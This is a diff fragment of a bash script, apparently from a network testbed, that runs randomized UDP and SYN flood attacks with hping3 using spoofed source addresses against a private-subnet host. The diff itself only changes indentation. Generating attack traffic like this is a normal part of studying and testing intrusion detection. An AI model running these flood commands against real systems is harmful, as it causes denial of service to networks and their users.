@@ -10,13 +10,13 @@ do
 	    echo "UDP Flood Attack will be running for $rand_run seconds. Next attack will be in $rand_stop seconds.";
 	    timeout $rand_run sudo hping3 -i u1 -2 -k -a 192.168.234.$rand_ip 192.168.234.1 -d 242 -I wave-data
 		
-		COUNTER=$(( COUNTER + 1 ))	
+	    COUNTER=$(( COUNTER + 1 ))	
 	    sleep $rand_stop		
 	else
-		echo "Syn Flood Attack will be running for $rand_run seconds. Next attack will be in $rand_stop seconds.";
-		timeout $rand_run sudo hping3 -i u1 -S -k -a 192.168.234.$rand_ip 192.168.234.1 -d 290 -I wave-data		
-		COUNTER=$(( COUNTER + 1 ))		
-		sleep $rand_stop
+	    echo "Syn Flood Attack will be running for $rand_run seconds. Next attack will be in $rand_stop seconds.";
+	    timeout $rand_run sudo hping3 -i u1 -S -k -a 192.168.234.$rand_ip 192.168.234.1 -d 290 -I wave-data		
+	    COUNTER=$(( COUNTER + 1 ))		
+	    sleep $rand_stop
 	fi
         
 	
